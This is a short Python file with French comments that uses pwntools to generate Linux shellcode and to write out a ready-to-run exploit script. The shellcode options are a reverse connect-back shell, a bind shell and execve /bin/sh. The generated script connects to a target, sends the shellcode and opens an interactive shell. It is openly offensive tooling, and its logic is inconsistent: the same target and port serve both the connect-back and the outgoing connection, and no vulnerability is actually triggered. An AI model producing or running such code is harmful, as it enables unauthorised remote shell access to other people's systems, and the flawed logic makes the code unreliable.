from pwn import *
import logging

def generate_shellcode(shellcode_type, target, custom_port, selected_arch):
    """Génère le shellcode approprié"""
    context.update(arch=selected_arch, os='linux')
    
    if shellcode_type == 'shell_reverse_tcp':
        return asm(shellcraft.linux.connectback(target, custom_port))
    elif shellcode_type == 'shell_bind_tcp':
        return asm(shellcraft.linux.bindsh(custom_port))
    elif shellcode_type == 'execve':
        return asm(shellcraft.linux.sh())
    else:
        raise ValueError("Type de shellcode non supporté")

def generate_exploit(shellcode_type, target, custom_port, selected_arch):
    """Génère l'exploit complet"""
    try:
        shellcode = generate_shellcode(shellcode_type, target, custom_port, selected_arch)
        
        exploit = f"""#!/usr/bin/python3
from pwn import *

def exploit():
    try:
        target = '{target}'
        port = {custom_port}
        
        r = remote(target, port)
        shellcode = {shellcode}
        r.sendline(shellcode)
        r.interactive()
        
    except Exception as e:
        print(f"❌ Erreur: {{str(e)}}")
        return False
    return True

if __name__ == '__main__':
    exploit()
"""
        return exploit
    except Exception as e:
        raise Exception(f"Erreur de génération: {str(e)}")